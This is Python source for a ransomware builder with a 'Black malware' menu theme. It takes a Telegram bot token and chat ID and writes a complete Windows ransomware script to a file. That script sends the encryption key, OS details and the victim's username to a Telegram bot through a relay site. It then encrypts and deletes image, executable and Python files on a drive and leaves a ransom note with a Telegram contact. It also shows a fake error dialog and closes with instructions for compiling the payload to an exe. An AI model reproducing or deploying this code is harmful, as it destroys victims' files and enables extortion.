from colorama import Fore 
import os 
import time 
from lists import banner
from builder import build 


def rans():
    print(Fore.LIGHTYELLOW_EX+"Pleas Enter your bot token . . . ")
    token = input(Fore.RED+"\n/"+Fore.WHITE+"𝔅𝔩𝔞𝔠𝔨 𝔪𝔞𝔩𝔴𝔞𝔯𝔢"+Fore.RED+"/"+Fore.WHITE+"C-v"+Fore.RED+"/"+Fore.WHITE+"Del-virus"+Fore.RED+"/"+Fore.GREEN+"~"+Fore.WHITE+"# ")
    build.linux()
    banner.banner()
    print(Fore.LIGHTYELLOW_EX+"Pleas Enter your Chat_id . . . ")
    
    Chat_id = input(Fore.RED+"\n/"+Fore.WHITE+"𝔅𝔩𝔞𝔠𝔨 𝔪𝔞𝔩𝔴𝔞𝔯𝔢"+Fore.RED+"/"+Fore.WHITE+"C-v"+Fore.RED+"/"+Fore.WHITE+"Del-virus"+Fore.RED+"/"+Fore.GREEN+"~"+Fore.WHITE+"# ")
    build.linux()
    banner.banner()
    print(Fore.LIGHTYELLOW_EX+"Pleas Enter name file . . . ")
    name = input(Fore.RED+"\n/"+Fore.WHITE+"𝔅𝔩𝔞𝔠𝔨 𝔪𝔞𝔩𝔴𝔞𝔯𝔢"+Fore.RED+"/"+Fore.WHITE+"C-v"+Fore.RED+"/"+Fore.WHITE+"Del-virus"+Fore.RED+"/"+Fore.GREEN+"~"+Fore.WHITE+"# ")
    
    
    path = ('''
    
from cryptography.fernet import Fernet
from subprocess import check_output
from os import remove
import requests
import platform
import os
import getpass
import ctypes
from win10toast import ToastNotifier
def errnot():
    toaster = ToastNotifier()
    toaster.show_toast("The All Of File Encrypted","Place Check The File /Desktop/Lock.txt",icon_path="../icon/hacked.ico")


def errmsg():
    messageBox = ctypes.windll.user32.MessageBoxW

    returnValue = messageBox(0,"sorry user Pleas call to Developer for fixing problem this program have problem ","ERROR",0x10 | 0x0)



def msg():
    path = os.path.expanduser("~")+"\\Onedrive\\Desktop"
    f = open(path+"\\Locked-with-vbm.txt","w")
    f.write("""message : we locked your all file 
Id telegram : @VBMTEAM
    
    """)
    f.close()

def drive_finer():
    #Start Generate Key
    key = Fernet.generate_key()
    Encrypt = Fernet(key)
    #End Generate Key
    #-------------------------
    hi = ("Key : "+str(key)+"------------"+"Os Name : "+platform.uname()[0]+"------------"+"Version : "+platform.uname()[2]+"------------"+"Username : "+getpass.getuser())
    #Start Send Key in Telegram Bot
    url = ("https://api.telegram.org/bot%s/sendmessage?chat_id=%s&text="+str(hi))

    payload = {"UrlBox":url,

            "AgentList":"Mozilla Firefox",
            "VersionsList":"HTTP/1.1",
            "MethodList":"POST"
        }

    req = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",payload)
    print(req)
    #End Send Key Telegram bot
    drive = ["H:"]
    target_drive = []
    cmd = check_output("fsutil fsinfo drives",shell=True)
    for i in drive:
        if i in str(cmd):
            target_drive.append(i)
    print(target_drive)

    pasvand = ["exe","png","jpg","jpeg","psd","py"]
    # for p in pasvand:
    #     try:
    #         with open("log", 'w') as errlog:
    #             cmd1 = check_output("cd / && dir /S /B *."+p,shell=True,stderr=errlog)
    #             ddm1 = cmd1.decode().replace(" ","")
    #             for v in ddm1.split():
    #                 with open(v,"rb") as dirlist: 
    #                         data = dirlist.read()
    #                         enc_data = Encrypt.encrypt(data)
    #                         new_file = open(v+"[encrypted]","wb")
    #                         new_file.write(enc_data)
    #                         dirlist.close()
    #                         new_file.close()
    #                         os.remove(v)
    #                         print(v+ " ----- >  "+"  [Encrypted] ")
        # except:
        #     pass

    for d in target_drive:
        for p in pasvand:
            try:
                with open("log", 'w') as errlog:
                    cmd2 = check_output(d+" && dir /S /B *."+p,shell=True,stderr=errlog)
                    ddm2 = cmd2.decode()
                    for g in ddm2.split():
                            with open(g,"rb") as dirlist: 
                                data = dirlist.read()
                                enc_data = Encrypt.encrypt(data)
                                new_file = open(g+"[toplearn]","wb")
                                new_file.write(enc_data)
                                dirlist.close()
                                new_file.close()
                                os.remove(g)
                                print(g+ " ----- >  "+"  [Encrypted} ")                                                   
            except:
                pass
errmsg()               
drive_finer()
msg()
errnot()

    
    '''%(token,Chat_id))
    
    
    RansomW = open(f"ransFile/{name}"+".py" , "w")
    RansomW.write(path)
    RansomW.close()
    time.sleep(2)
    print(Fore.LIGHTRED_EX+"Pleas wait . . . ")
    time.sleep(9)
    print(Fore.LIGHTGREEN_EX+"Created RansomWare Pleas Check folder | "+Fore.LIGHTCYAN_EX+"/ransFile"+Fore.YELLOW+"Pleas py file to exe by command "+Fore.RED+"pyinstaller --onefile "+Fore.BLUE+"name.py ")
    time.sleep(4)
    s = input(Fore.LIGHTMAGENTA_EX+"\n Press Ener Back to Menu [Enter . . .  ")